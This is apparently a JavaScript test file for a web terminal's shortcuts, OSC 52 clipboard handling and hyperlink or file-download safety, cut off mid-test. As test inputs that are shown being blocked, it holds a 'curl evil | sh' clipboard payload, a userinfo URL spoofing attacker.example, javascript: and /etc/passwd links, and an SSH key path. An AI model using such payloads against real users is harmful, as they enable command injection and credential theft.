import test from 'node:test';
import assert from 'node:assert/strict';
import {
	attachTerminalInteractions, beginGestureClipboardWrite, decodeOSC52,
	isAgentTerminalPath, isBrowserPasteShortcut, isComposeMessageShortcut, safeTerminalLink,
	terminalPathToken, transferFiles,
	isTerminalClipboardRequestShortcut, shouldArmTmuxClipboard, selectedText, terminalKeyInput,
	visibleLocalFileLinkProvider,
	visibleLocalFileLinks,
} from '../dashboard/js/terminal-interactions.js';
import { REMOTE_FILE_ERRORS } from '../dashboard/js/remote-files.js';

function key(overrides = {}) {
  return {
    type: 'keydown', key: 'Enter', shiftKey: false,
    altKey: false, ctrlKey: false, metaKey: false,
    ...overrides,
  };
}

test('Shift+Enter becomes the universal Ctrl+J newline byte', () => {
  assert.equal(terminalKeyInput(key({ shiftKey: true })), '\n');
});

test('Ctrl/Cmd+M is reserved only for the exact compose chord', () => {
	assert.equal(isComposeMessageShortcut(key({ key: 'm', code: 'KeyM', ctrlKey: true })), true);
	assert.equal(isComposeMessageShortcut(key({ key: 'M', code: 'KeyM', metaKey: true })), true);
	assert.equal(isComposeMessageShortcut(key({ key: 'm', code: 'KeyM' })), false);
	assert.equal(isComposeMessageShortcut(key({ key: 'm', code: 'KeyM', ctrlKey: true, shiftKey: true })), false);
	assert.equal(isComposeMessageShortcut(key({ key: 'm', code: 'KeyM', ctrlKey: true, isComposing: true })), false);
});

test('plain Enter and unrelated keys remain xterm-owned', () => {
  assert.equal(terminalKeyInput(key()), null);
  assert.equal(terminalKeyInput(key({ key: 'a', shiftKey: true })), null);
  assert.equal(terminalKeyInput(key({ type: 'keyup', shiftKey: true })), null);
});

test('additional modifiers on Shift+Enter remain xterm-owned', () => {
  for (const modifier of ['altKey', 'ctrlKey', 'metaKey']) {
    assert.equal(terminalKeyInput(key({ shiftKey: true, [modifier]: true })), null, modifier);
  }
});

test('both Ctrl and Meta paste shortcuts stay browser-owned on every platform', () => {
  for (const shortcut of [
    key({ key: 'v', code: 'KeyV', ctrlKey: true }),
    key({ key: 'V', code: 'KeyV', ctrlKey: true, shiftKey: true }),
    key({ key: 'v', code: 'KeyV', metaKey: true }),
    key({ key: 'V', code: 'KeyV', metaKey: true, shiftKey: true }),
  ]) {
    assert.equal(isBrowserPasteShortcut(shortcut), true);
  }
});

test('unrelated and Alt-modified V chords remain terminal-owned', () => {
  assert.equal(isBrowserPasteShortcut(key({ key: 'v', code: 'KeyV' })), false);
  assert.equal(isBrowserPasteShortcut(
    key({ key: 'v', code: 'KeyV', ctrlKey: true, altKey: true })), false);
  assert.equal(isBrowserPasteShortcut(
    key({ type: 'keyup', key: 'v', code: 'KeyV', ctrlKey: true })), false);
});

test('plain Ctrl/Cmd+C arms an application clipboard request without claiming modified chords', () => {
  assert.equal(isTerminalClipboardRequestShortcut(
    key({ key: 'c', code: 'KeyC', ctrlKey: true })), true);
  assert.equal(isTerminalClipboardRequestShortcut(
    key({ key: 'C', code: 'KeyC', metaKey: true })), true);
  assert.equal(isTerminalClipboardRequestShortcut(
    key({ key: 'c', code: 'KeyC', ctrlKey: true, shiftKey: true })), false);
  assert.equal(isTerminalClipboardRequestShortcut(
    key({ key: 'c', code: 'KeyC', ctrlKey: true, altKey: true })), false);
  assert.equal(isTerminalClipboardRequestShortcut(
    key({ key: 'c', code: 'KeyC', ctrlKey: true, metaKey: true })), false);
  assert.equal(isTerminalClipboardRequestShortcut(
    key({ key: 'c', code: 'KeyC' })), false);
  assert.equal(isTerminalClipboardRequestShortcut(
    key({ type: 'keyup', key: 'c', code: 'KeyC', ctrlKey: true })), false);
  assert.equal(isTerminalClipboardRequestShortcut(
    key({ key: 'c', code: 'KeyC', ctrlKey: true, isComposing: true })), false);
});

test('Shift+Enter remains xterm-owned while an IME composition is active', () => {
  assert.equal(terminalKeyInput(key({ shiftKey: true, isComposing: true })), null);
  assert.equal(terminalKeyInput(key({ shiftKey: true, keyCode: 229 })), null);
});

test('OSC 52 decodes tmux clipboard text as UTF-8', () => {
  const text = 'first line\nsmörgåsbord 🧇';
  const encoded = Buffer.from(text, 'utf8').toString('base64');
  assert.equal(decodeOSC52(`c;${encoded}`), text);
});

test('OSC 52 accepts an empty clipboard but rejects queries and malformed data', () => {
  assert.equal(decodeOSC52('c;'), '');
  assert.equal(decodeOSC52('c;?'), null);
  assert.equal(decodeOSC52('missing-separator'), null);
  assert.equal(decodeOSC52('c;not base64'), null);
  assert.equal(decodeOSC52('c;abcd='), null);
});

test('OSC 52 rejects decoded clipboard text over the one MiB bound', () => {
  const oversized = Buffer.alloc(1024 * 1024 + 1, 0x61).toString('base64');
  assert.equal(decodeOSC52(`c;${oversized}`), null);
});

test('gesture clipboard write starts synchronously and resolves its text later', async () => {
  let writtenItems = null;
  let writtenBlob = null;
  class FakeClipboardItem {
    constructor(data) { this.data = data; }
  }
  const clipboard = {
    write(items) {
      writtenItems = items;
      return items[0].data['text/plain'].then((blob) => { writtenBlob = blob; });
    },
  };

  const deferred = beginGestureClipboardWrite({
    clipboard, ClipboardItemCtor: FakeClipboardItem, BlobCtor: Blob,
  });
  assert.ok(deferred);
  assert.equal(writtenItems.length, 1, 'clipboard.write ran before OSC text existed');
  assert.equal(writtenBlob, null);

  deferred.resolve('tmux selection 🧇');
  assert.equal(await deferred.result, true);
  assert.equal(writtenBlob.type, 'text/plain');
  assert.equal(await writtenBlob.text(), 'tmux selection 🧇');
});

test('gesture clipboard cancellation rejects the pending representation quietly', async () => {
  class FakeClipboardItem {
    constructor(data) { this.data = data; }
  }
  const clipboard = {
    write(items) { return items[0].data['text/plain']; },
  };
  const deferred = beginGestureClipboardWrite({
    clipboard, ClipboardItemCtor: FakeClipboardItem, BlobCtor: Blob,
  });
  deferred.cancel();
  assert.equal(await deferred.result, false);
});

test('gesture clipboard write degrades when ClipboardItem is unavailable', () => {
  let called = false;
  const deferred = beginGestureClipboardWrite({
    clipboard: { write() { called = true; } }, ClipboardItemCtor: undefined, BlobCtor: Blob,
  });
  assert.equal(deferred, null);
  assert.equal(called, false);
});

test('tmux clipboard arming requires a tracked unmodified copy gesture', () => {
  const event = {
    button: 0, detail: 1, altKey: false, shiftKey: false, ctrlKey: false, metaKey: false,
  };
  assert.equal(shouldArmTmuxClipboard({ moved: true }, event, 'drag'), true);
  assert.equal(shouldArmTmuxClipboard({ moved: false }, { ...event, detail: 2 }, 'drag'), true,
    'tmux double-click copy does not move');
  assert.equal(shouldArmTmuxClipboard({ moved: false }, event, 'drag'), false,
    'plain clicks do not arm');
  assert.equal(shouldArmTmuxClipboard({ moved: true }, event, 'none'), false,
    'browser-owned selection does not request clipboard permission');
  assert.equal(shouldArmTmuxClipboard({ moved: true }, { ...event, shiftKey: true }, 'drag'), false,
    'modifier-forced browser selection does not arm');
});

class FakeEventTarget {
  constructor() { this.listeners = new Map(); }
  addEventListener(type, fn) {
    if (!this.listeners.has(type)) this.listeners.set(type, new Set());
    this.listeners.get(type).add(fn);
  }
  removeEventListener(type, fn) { this.listeners.get(type)?.delete(fn); }
  dispatch(type, event) {
    for (const fn of this.listeners.get(type) || []) fn(event);
  }
}

function terminalHarness(ownerDocument) {
  const host = new FakeEventTarget();
  host.ownerDocument = ownerDocument;
  host.title = '';
  let osc52 = null;
  let keyHandler = null;
  let linkProvider = null;
  const inputs = [];
  const term = {
    options: {},
    buffer: { active: { getLine() { return null; } } },
    modes: { mouseTrackingMode: 'drag' },
    parser: {
      registerOscHandler(id, handler) {
        assert.equal(id, 52);
        osc52 = handler;
        return { dispose() {} };
      },
    },
    onSelectionChange() { return { dispose() {} }; },
    registerLinkProvider(provider) {
      linkProvider = provider;
      return { dispose() {} };
    },
    attachCustomKeyEventHandler(handler) { keyHandler = handler; },
    hasSelection() { return false; },
    getSelection() { return ''; },
    input(value) { inputs.push(value); },
    focus() {},
  };
  return {
    host, term,
    key: (event) => keyHandler(event),
    inputs,
    linkProvider: () => linkProvider,
    osc52: (payload) => osc52(payload),
  };
}

test('terminal wiring reserves Ctrl+V without canceling the browser paste event', () => {
  const doc = new FakeEventTarget();
  const harness = terminalHarness(doc);
  const interactions = attachTerminalInteractions({ term: harness.term, host: harness.host });
  try {
    let prevented = false;
    const event = key({
      key: 'v', code: 'KeyV', ctrlKey: true,
      preventDefault() { prevented = true; },
    });
    assert.equal(harness.key(event), false, 'xterm must not forward Ctrl+V to the PTY');
    assert.equal(prevented, false, 'the browser must still dispatch its paste event');
  } finally {
    interactions.dispose();
  }
});

test('terminal wiring yields only claimed Ctrl/Cmd-K chords to dashboard chrome', () => {
  const doc = new FakeEventTarget();
  const harness = terminalHarness(doc);
  const requests = [];
  const interactions = attachTerminalInteractions({
    term: harness.term,
    host: harness.host,
    requestPalette: (documentRef, detail) => {
      requests.push([documentRef, detail]);
      return true;
    },
  });
  try {
    let prevented = false;
    const paletteEvent = key({
      key: 'k', code: 'KeyK', metaKey: true,
      preventDefault() { prevented = true; },
      stopPropagation() {},
    });
    assert.equal(harness.key(paletteEvent), false, 'a claimed palette chord never reaches the PTY');
    assert.equal(prevented, true);
    assert.deepEqual(requests, [[doc, { source: 'terminal' }]]);

    assert.equal(harness.key(key({ key: 'a', code: 'KeyA' })), true);
    assert.equal(harness.key(key({ key: 'l', code: 'KeyL', ctrlKey: true })), true);
    assert.deepEqual(requests, [[doc, { source: 'terminal' }]],
      'all non-palette terminal keys bypass the dashboard bridge');
  } finally {
    interactions.dispose();
  }
});

test('terminal keeps Ctrl-K when no surrounding command palette claims it', () => {
  const doc = new FakeEventTarget();
  const harness = terminalHarness(doc);
  const interactions = attachTerminalInteractions({
    term: harness.term, host: harness.host, requestPalette: () => false,
  });
  try {
    let prevented = false;
    const event = key({
      key: 'k', code: 'KeyK', ctrlKey: true,
      preventDefault() { prevented = true; },
      stopPropagation() {},
    });
    assert.equal(harness.key(event), true, 'standalone xterm retains Ctrl-K');
    assert.equal(prevented, false);
  } finally {
    interactions.dispose();
  }
});

function drag(harness, ownerDocument) {
  const plain = { button: 0, detail: 1, altKey: false, shiftKey: false, ctrlKey: false, metaKey: false };
  harness.host.dispatch('mousedown', { ...plain, clientX: 1, clientY: 1 });
  ownerDocument.dispatch('mousemove', { ...plain, clientX: 10, clientY: 1 });
  ownerDocument.dispatch('mouseup', { ...plain, clientX: 10, clientY: 1 });
}

test('terminal lifecycle accepts OSC 52 only after a pointer or keyboard copy gesture', async () => {
  const oldNavigator = Object.getOwnPropertyDescriptor(globalThis, 'navigator');
  const oldClipboardItem = Object.getOwnPropertyDescriptor(globalThis, 'ClipboardItem');
  const writes = [];
  class FakeClipboardItem {
    constructor(data) { this.data = data; }
  }
  const clipboard = {
    write(items) {
      const representation = items[0].data['text/plain'];
      const result = representation.then(async blob => ({ type: blob.type, text: await blob.text() }));
      writes.push(result);
      return result.then(() => undefined);
    },
  };
  Object.defineProperty(globalThis, 'navigator', { configurable: true, value: { clipboard } });
  Object.defineProperty(globalThis, 'ClipboardItem', { configurable: true, value: FakeClipboardItem });

  const doc = new FakeEventTarget();
  const first = terminalHarness(doc);
  const second = terminalHarness(doc);
  const firstInteractions = attachTerminalInteractions({
    term: first.term, host: first.host, applicationClipboardShortcuts: true,
  });
  const secondInteractions = attachTerminalInteractions({ term: second.term, host: second.host });
  try {
    // An OSC sequence with no preceding mouse copy is consumed but cannot
    // start a browser clipboard write.
    first.osc52(`;${Buffer.from('poison').toString('base64')}`);
    assert.equal(writes.length, 0);

    const copyEvent = key({ key: 'c', code: 'KeyC', ctrlKey: true });
    assert.equal(first.key(copyEvent), true, 'the application must still receive Ctrl+C');
    assert.deepEqual(first.inputs, [], 'xterm owns the ordinary Ctrl+C encoding');
    assert.equal(writes.length, 1, 'keyboard gesture starts the deferred browser write');
    first.osc52(`;${Buffer.from('copilot selection').toString('base64')}`);
    assert.deepEqual(await writes[0], { type: 'text/plain', text: 'copilot selection' });

    let metaPrevented = false;
    const metaCopyEvent = key({
      key: 'c', code: 'KeyC', metaKey: true,
      preventDefault() { metaPrevented = true; },
    });
    assert.equal(first.key(metaCopyEvent), false, 'xterm must not translate Cmd+C to Escape-c');
    assert.equal(metaPrevented, true);
    assert.deepEqual(first.inputs, ['\x03'], 'Cmd+C reaches the TUI as the Ctrl+C byte');
    assert.equal(writes.length, 2);
    first.osc52(`;${Buffer.from('mac copilot selection').toString('base64')}`);
    assert.deepEqual(await writes[1], { type: 'text/plain', text: 'mac copilot selection' });

    drag(first, doc);
    assert.equal(writes.length, 3);
    drag(second, doc);
    assert.equal(writes.length, 4, 'new pane supersedes the first page-global write');
    await assert.rejects(writes[2], /canceled/);

    // The canceled pane no longer owns the active token, so its later OSC is
    // ignored rather than resolving the second pane's clipboard item.
    first.osc52(`;${Buffer.from('stale').toString('base64')}`);
    second.osc52(`;${Buffer.from('latest 🧇').toString('base64')}`);
    assert.deepEqual(await writes[3], { type: 'text/plain', text: 'latest 🧇' });

    drag(first, doc);
    assert.equal(writes.length, 5);
    firstInteractions.invalidate();
    await assert.rejects(writes[4], /canceled/);
    first.osc52(`;${Buffer.from('after invalidate').toString('base64')}`);
    assert.equal(writes.length, 5);
  } finally {
    firstInteractions.dispose();
    secondInteractions.dispose();
    if (oldNavigator) Object.defineProperty(globalThis, 'navigator', oldNavigator);
    else delete globalThis.navigator;
    if (oldClipboardItem) Object.defineProperty(globalThis, 'ClipboardItem', oldClipboardItem);
    else delete globalThis.ClipboardItem;
  }
});

test('application clipboard shortcuts stay disabled for non-Copilot terminals', () => {
  const doc = new FakeEventTarget();
  const harness = terminalHarness(doc);
  const interactions = attachTerminalInteractions({ term: harness.term, host: harness.host });
  try {
    let prevented = false;
    const event = key({
      key: 'c', code: 'KeyC', metaKey: true,
      preventDefault() { prevented = true; },
    });
    assert.equal(harness.key(event), true);
    assert.equal(prevented, false);
    assert.deepEqual(harness.inputs, []);
  } finally {
    interactions.dispose();
  }
});

// An OSC 8 hyperlink picks its label text independently of its target, so the
// hover reveal is the only thing standing between "see the docs" and wherever
// it actually points. These drive the real linkHandler the terminal installs.
function linkHarness(options = {}, setupDocument = () => {}) {
  const doc = new FakeEventTarget();
  setupDocument(doc);
  const harness = terminalHarness(doc);
  const statuses = [];
  const interactions = attachTerminalInteractions({
    term: harness.term,
    host: harness.host,
    setStatus: (text) => statuses.push(text),
    baseStatus: () => 'BASE',
    ...options,
  });
  return { harness, statuses, interactions, links: harness.term.options.linkHandler };
}

test('hovering a hyperlink reveals its real destination, and leaving restores the base status', () => {
  const { statuses, interactions, links } = linkHarness();
  try {
    links.hover({}, 'https://linear.app/doc/abc123');
    assert.deepEqual(statuses, ['Ctrl/Cmd-click → https://linear.app/doc/abc123']);
    links.leave();
    assert.equal(statuses.at(-1), 'BASE', 'the hint must not outlive the pointer');
  } finally {
    interactions.dispose();
  }
});

test('a long target keeps its origin intact and truncates only the path', () => {
  const { statuses, interactions, links } = linkHarness();
  try {
    const url = `https://linear.app/${'segment/'.repeat(40)}end`;
    links.hover({}, url);
    const shown = statuses.at(-1);
    assert.ok(shown.includes('https://linear.app/'),
      `the origin answers "who am I contacting" and must survive shortening: ${shown}`);
    assert.ok(shown.endsWith('…'), `an over-long path is elided at the tail: ${shown}`);
    assert.ok(shown.length <= 140, `status stays one line: ${shown.length}`);
  } finally {
    interactions.dispose();
  }
});

// The oldest URL spoof: everything before the '@' is userinfo, so this renders
// as github.com while pointing at attacker.example.
test('a link carrying userinfo is refused rather than described', () => {
  const { statuses, interactions, links } = linkHarness();
  const opened = [];
  const oldOpen = globalThis.window;
  Object.defineProperty(globalThis, 'window', {
    value: { open: (...args) => opened.push(args) }, configurable: true, writable: true,
  });
  try {
    const spoof = 'https://github.com.trusted.example.review-this@attacker.example/pwn';
    links.hover({}, spoof);
    assert.equal(statuses.at(-1), 'blocked unsafe link');
    links.activate({ ctrlKey: true }, spoof);
    assert.deepEqual(opened, [], 'a credentialed URL must never be opened');
  } finally {
    interactions.dispose();
    if (oldOpen === undefined) delete globalThis.window;
    else Object.defineProperty(globalThis, 'window', { value: oldOpen, configurable: true, writable: true });
  }
});

test('non-HTTP schemes stay blocked', () => {
  const { statuses, interactions, links } = linkHarness();
  try {
    for (const raw of ['javascript:alert(1)', 'file://remote-host/etc/passwd', 'data:text/html,x']) {
      links.hover({}, raw);
      assert.equal(statuses.at(-1), 'blocked unsafe link', raw);
    }
  } finally {
    interactions.dispose();
  }
});

test('local OSC 8 file URLs decode to host paths without query or fragment metadata', () => {
  assert.deepEqual(
    safeTerminalLink('file:///tmp/rendered%20results/chart.png?line=2#L2'),
    { kind: 'file', target: '/tmp/rendered results/chart.png' },
  );
  assert.deepEqual(
    safeTerminalLink('file://localhost/home/me/report.md'),
    { kind: 'file', target: '/home/me/report.md' },
  );
  assert.deepEqual(
    safeTerminalLink('/home/me/rendered%20image.png#L12'),
    { kind: 'file', target: '/home/me/rendered image.png' },
  );
  for (const raw of [
    'file://other-host/tmp/report.md',
    '//other-host/tmp/report.md',
    'file:///tmp/bad%ZZname',
    'file:relative.txt',
  ]) {
    assert.equal(safeTerminalLink(raw), null, raw);
  }
});

test('visible local-file detection finds absolute paths without stealing web URLs', () => {
  const text = 'docs https://example.test/a/b literal file:///tmp/report%20one.md image /home/me/render.png).';
  assert.deepEqual(visibleLocalFileLinks(text), [
    {
      text: 'file:///tmp/report%20one.md',
      start: text.indexOf('file:///tmp/report%20one.md'),
      end: text.indexOf('file:///tmp/report%20one.md') + 'file:///tmp/report%20one.md'.length,
    },
    {
      text: '/home/me/render.png',
      start: text.indexOf('/home/me/render.png'),
      end: text.indexOf('/home/me/render.png') + '/home/me/render.png'.length,
    },
  ]);
  for (const value of [
    'relative.png //server/share /',
    'example.com/docs/getting-started',
    'abc/def',
    '2026/07/30',
    '/tmp/my report.png',
    '/tmp/report.png followed by prose',
  ]) {
    assert.deepEqual(visibleLocalFileLinks(value), [], value);
  }
});

test('visible local-file provider maps detected text to xterm cells', () => {
  const text = 'get /tmp/result.png';
  const line = {
    length: text.length,
    isWrapped: false,
    translateToString: () => text,
    getCell: (col) => ({
      getWidth: () => 1,
      getChars: () => text[col],
    }),
  };
  const term = { buffer: { active: { getLine: (row) => row === 2 ? line : null } } };
  const handlers = { activate() {}, hover() {}, leave() {} };
  const provider = visibleLocalFileLinkProvider(term, handlers);
  let links;
  provider.provideLinks(3, (value) => { links = value; });
  assert.equal(links.length, 1);
  assert.equal(links[0].text, '/tmp/result.png');
  assert.deepEqual(links[0].range, {
    start: { x: 5, y: 3 },
    end: { x: 19, y: 3 },
  });
  assert.equal(links[0].activate, handlers.activate);
});

test('visible local-file provider maps wrapped and wide-cell paths', () => {
  const rows = ['界 /tmp/long-', 'result.png'];
  const lines = rows.map((text, row) => ({
    length: row === 0 ? text.length + 1 : text.length,
    isWrapped: row > 0,
    translateToString: () => text,
    getCell: (col) => {
      if (row === 0 && col === 0) {
        return { getWidth: () => 2, getChars: () => '界' };
      }
      if (row === 0 && col === 1) {
        return { getWidth: () => 0, getChars: () => '' };
      }
      const char = text[col - (row === 0 ? 1 : 0)];
      return { getWidth: () => 1, getChars: () => char || '' };
    },
  }));
  const term = { buffer: { active: { getLine: (row) => lines[row] || null } } };
  const provider = visibleLocalFileLinkProvider(term, {
    activate() {}, hover() {}, leave() {},
  });
  let links;
  provider.provideLinks(1, (value) => { links = value; });
  assert.equal(links.length, 1);
  assert.equal(links[0].text, '/tmp/long-result.png');
  assert.deepEqual(links[0].range, {
    start: { x: 4, y: 1 },
    end: { x: 10, y: 2 },
  });
  provider.provideLinks(2, (value) => { links = value; });
  assert.equal(links.length, 1);
  assert.deepEqual(links[0].range.end, { x: 10, y: 2 });
});

test('file hyperlinks reveal the host path and download only on a modified click', async () => {
  const downloaded = [];
  const { statuses, interactions, links } = linkHarness({
    downloadFile: (path) => downloaded.push(path),
  });
  try {
    const raw = 'file:///tmp/final%20chart.png#L1';
    links.hover({}, raw);
    assert.equal(statuses.at(-1), 'Ctrl/Cmd-click download → /tmp/final chart.png');
    links.activate({}, raw);
    assert.equal(statuses.at(-1), 'Ctrl/Cmd-click to download /tmp/final chart.png');
    assert.deepEqual(downloaded, []);
    links.activate({ metaKey: true }, raw);
    assert.deepEqual(downloaded, ['/tmp/final chart.png']);
    await Promise.resolve();
    assert.equal(statuses.at(-1), 'downloading final chart.png…');
  } finally {
    interactions.dispose();
  }
});

test('long file-link hover text stays bounded without changing the download target', async () => {
  const downloaded = [];
  const { statuses, interactions, links } = linkHarness({
    downloadFile: (path) => downloaded.push(path),
  });
  try {
    const path = `/home/agent/${'deep-directory/'.repeat(20)}result.png`;
    links.hover({}, `file://${path}`);
    const shown = statuses.at(-1);
    assert.ok(shown.endsWith('result.png'), shown);
    assert.ok(shown.includes('…'), shown);
    assert.ok(shown.length <= 130, `file-link status stays on one line: ${shown.length}`);
    links.activate({ ctrlKey: true }, `file://${path}`);
    assert.deepEqual(downloaded, [path], 'shortening is display-only');
  } finally {
    interactions.dispose();
  }
});

test('file downloads preflight through fetch and surface a non-2xx response', async () => {
  const fetches = [];
  const anchors = [];
  const { statuses, interactions, links } = linkHarness({
    terminalPath: '/api/term-ws/agent?which=current',
    fetchImpl: async (...args) => {
      fetches.push(args);
      return { ok: false, status: 403 };
    },
  }, (doc) => {
    doc.body = { append: (anchor) => anchors.push(anchor) };
    doc.createElement = () => ({
      style: {}, click() { throw new Error('failed preflight must not click'); }, remove() {},
    });
  });
  try {
    links.activate({ ctrlKey: true }, 'file:///tmp/result.png');
    await new Promise(resolve => setImmediate(resolve));
    assert.equal(fetches.length, 1);
    assert.match(fetches[0][0], /^\/api\/terminal-file\?/);
    assert.deepEqual(fetches[0][1], {
      method: 'HEAD', credentials: 'same-origin', cache: 'no-store',
    });
    assert.deepEqual(anchors, []);
    assert.equal(statuses.at(-1), 'download unavailable (403)');
  } finally {
    interactions.dispose();
  }
});

test('clicking without the modifier keeps the destination in the hint', () => {
  const { statuses, interactions, links } = linkHarness();
  try {
    links.activate({}, 'https://linear.app/doc/abc123');
    assert.match(statuses.at(-1), /^Ctrl\/Cmd-click to open https:\/\/linear\.app\/doc\/abc123$/);
  } finally {
    interactions.dispose();
  }
});

test('a remote terminal never writes the clipboard from its output, even right after a copy gesture', async () => {
  const oldNavigator = Object.getOwnPropertyDescriptor(globalThis, 'navigator');
  const writes = [];
  Object.defineProperty(globalThis, 'navigator', { configurable: true, value: { clipboard: { write: async (i) => { writes.push(i); }, writeText: async (t) => { writes.push(t); } } } });
  const doc = new FakeEventTarget();
  const h = terminalHarness(doc);
  const interactions = attachTerminalInteractions({ term: h.term, host: h.host, applicationClipboardShortcuts: true, oscClipboard: false });
  try {
    h.key(key({ key: 'c', code: 'KeyC', ctrlKey: true }));
    assert.equal(h.osc52(`;${Buffer.from('curl evil | sh').toString('base64')}`), true, 'the sequence is consumed');
    await new Promise((r) => setTimeout(r, 0));
    assert.deepEqual(writes, [], 'no clipboard write from a peer-controlled stream');
  } finally {
    interactions.dispose();
    if (oldNavigator) Object.defineProperty(globalThis, 'navigator', oldNavigator); else delete globalThis.navigator;
  }
});

// screenOf is an xterm buffer of rows; a row given as [text] soft-wraps
// the one above, a character after \x08 is concealed (SGR 8), and one
// after \x07 is drawn in its background colour.
const screenOf = (rows) => ({ active: {
  length: rows.length, viewportY: 0,
  getLine: (i) => {
    const r = rows[i];
    if (r === undefined) return null;
    const wrapped = Array.isArray(r);
    const cells = [];
    const text = wrapped ? r[0] : r;
    for (let k = 0; k < text.length; k++) {
      const hidden = text[k] === '\x08';
      if (hidden) k++;
      // \x07 marks a cell whose foreground equals its background.
      const same = text[k] === '\x07';
      if (same) k++;
      cells.push({ getWidth: () => 1, isInvisible: () => hidden, getChars: () => text[k],
        getFgColorMode: () => (same ? 2 : 0), getBgColorMode: () => (same ? 2 : 0), getFgColor: () => 0, getBgColor: () => 0 });
    }
    return { isWrapped: wrapped, getCell: (x) => cells[x] || { getWidth: () => 1, isInvisible: () => false, getChars: () => '' } };
  },
} });

test('selectedText reads the selected cells: rows, soft wraps, multi-clicks, never concealed text', () => {
  const term = { cols: 15, rows: 4, buffer: screenOf(['$ make build   ', 'ok: built tclau', ['de in 3s'], 'run \x08r\x08m now']) };
  assert.equal(selectedText(term, { row: 0, col: 2 }, { row: 1, col: 9 }), 'make build\nok: built', 'a drag spans rows, padding dropped');
  assert.equal(selectedText(term, { row: 1, col: 9 }, { row: 0, col: 2 }), 'make build\nok: built', 'either drag direction');
  assert.equal(selectedText(term, { row: 1, col: 10 }, { row: 2, col: 1 }), 'tclaude', 'a soft wrap rejoins without a break');
  assert.equal(selectedText(term, { row: 0, col: 4 }, { row: 0, col: 4 }, 2), 'make', 'a double-click takes the word');
  assert.equal(selectedText(term, { row: 0, col: 4 }, { row: 0, col: 4 }, 3), '$ make build', 'a triple-click takes the row');
  assert.equal(selectedText(term, { row: 3, col: 0 }, { row: 3, col: 9 }), 'run    now', 'concealed cells read as blanks');
  assert.equal(selectedText(term, { row: 0, col: 1 }, { row: 0, col: 1 }, 2), null, 'a double-click on a blank selects nothing');
  assert.equal(selectedText({}, { row: 0, col: 0 }, { row: 0, col: 1 }), null);
  const hidden = { cols: 12, rows: 1, buffer: screenOf(['ls \x07;\x07r\x07m']) };
  assert.equal(selectedText(hidden, { row: 0, col: 0 }, { row: 0, col: 0 }, 3), 'ls', 'text in its background colour reads as blanks');
});

test('selectedText expands a double-click over columns, not string offsets', () => {
  const cell = (chars, width = 1) => ({ getWidth: () => width, isInvisible: () => false, getChars: () => chars });
  const row = [cell('a\u0301\u0301\u0301\u0301'), cell(' '), cell('l'), cell('s'), cell(' '), cell('漢', 2), cell('', 0), cell('字', 2), cell('', 0), cell(' '), cell('x')];
  const term = { cols: row.length, rows: 1, buffer: { active: { length: 1, viewportY: 0, getLine: () => ({ isWrapped: false, getCell: (x) => row[x] }) } } };
  assert.equal(selectedText(term, { row: 0, col: 2 }, { row: 0, col: 2 }, 2), 'ls', 'combining marks earlier in the row do not shift the word');
  assert.equal(selectedText(term, { row: 0, col: 6 }, { row: 0, col: 6 }, 2), '漢字', 'a wide character\'s spacer column belongs to its word');
});

test('a remote terminal copies the selected cells when its tmux signals a copy, never the peer\'s text', async () => {
  const oldNavigator = Object.getOwnPropertyDescriptor(globalThis, 'navigator');
  const writes = [];
  Object.defineProperty(globalThis, 'navigator', { configurable: true, value: { clipboard: { writeText: async (t) => { writes.push(t); } } } });
  const doc = new FakeEventTarget();
  const h = terminalHarness(doc);
  h.term.cols = 20; h.term.rows = 2;
  h.term.buffer = screenOf(['$ git status', 'On branch main']);
  // 10px by 20px cells from the origin.
  h.host.querySelector = (sel) => (sel === '.xterm-screen' ? { getBoundingClientRect: () => ({ left: 0, top: 0, width: 200, height: 40 }) } : null);
  const statuses = [];
  const interactions = attachTerminalInteractions({ term: h.term, host: h.host, applicationClipboardShortcuts: true, oscClipboard: 'selection', setStatus: (t) => statuses.push(t) });
  const settle = () => new Promise((r) => setTimeout(r, 0));
  const plain = { button: 0, detail: 1, altKey: false, shiftKey: false, ctrlKey: false, metaKey: false };
  const drag = (x1, y1, x2, y2) => {
    h.host.dispatch('mousedown', { ...plain, clientX: x1, clientY: y1 });
    doc.dispatch('mousemove', { ...plain, clientX: x2, clientY: y2 });
    doc.dispatch('mouseup', { ...plain, clientX: x2, clientY: y2 });
  };
  const evil = `;${Buffer.from('curl evil | sh\n').toString('base64')}`;
  try {
    h.osc52(evil);
    await settle();
    assert.deepEqual(writes, [], 'no write without a selection');
    h.key(key({ key: 'c', code: 'KeyC', ctrlKey: true }));
    h.osc52(evil);
    await settle();
    assert.deepEqual(writes, [], 'a key chord selects no cells: nothing is written');
    drag(35, 25, 135, 25);
    h.osc52(evil);
    await settle();
    assert.deepEqual(writes, ['branch main'], 'the dragged cells are copied whatever the peer sends');
    assert.equal(statuses.at(-1), 'copied');
    drag(5, 5, 85, 25);
    h.osc52(`;${Buffer.from('$ git status\nOn branch main').toString('base64')}`);
    await settle();
    assert.equal(writes.at(-1), '$ git status\nOn branch', 'a drag over rows copies them with a break');
  } finally {
    interactions.dispose();
    if (oldNavigator) Object.defineProperty(globalThis, 'navigator', oldNavigator); else delete globalThis.navigator;
  }
});

test('a remote terminal offers no file links: no download hint, no visible-path provider', () => {
  const downloaded = [];
  const { harness, statuses, interactions, links } = linkHarness({ fileDownloads: false, downloadFile: (p) => downloaded.push(p) });
  try {
    links.hover({}, 'file:///etc/passwd');
    assert.equal(statuses.at(-1), 'blocked unsafe link');
    links.activate({ ctrlKey: true }, '/home/me/.ssh/id_ed25519');
    assert.deepEqual(downloaded, []);
    assert.equal(harness.linkProvider(), null, 'visible paths are not turned into links');
    links.hover({}, 'https://example.com/docs');
    assert.match(statuses.at(-1), /Ctrl\/Cmd-click → https:\/\/example\.com\/docs/, 'http(s) links still work');
    links.hover({}, 'javascript:alert(1)');
    assert.equal(statuses.at(-1), 'blocked unsafe link');
  } finally {
    interactions.dispose();
  }
});

test('a remote terminal links visible paths only while the live view holds the peer file grant, and explains refusals', async () => {
  let viewer = '';
  const fetches = []; const anchors = [];
  let answer = async () => ({ ok: true, status: 200 });
  const terminalPath = '/api/federation/terminal?peer=inst_forge&agent=agt_a1&mode=watch';
  const { harness, statuses, interactions, links } = linkHarness({
    fileDownloads: false, terminalPath,
    remoteFileViewer: () => viewer,
    fetchImpl: async (url, init) => { fetches.push([url, init]); return answer(url, init); },
  }, (doc) => {
    doc.body = { append: (a) => anchors.push(a) };
    doc.createElement = () => ({ style: {}, click() { this.clicked = true; }, remove() {} });
  });
  const text = 'wrote /srv/proj/out/report.txt';
  const line = { length: text.length, isWrapped: false, translateToString: () => text, getCell: (col) => ({ getWidth: () => 1, getChars: () => text[col] }) };
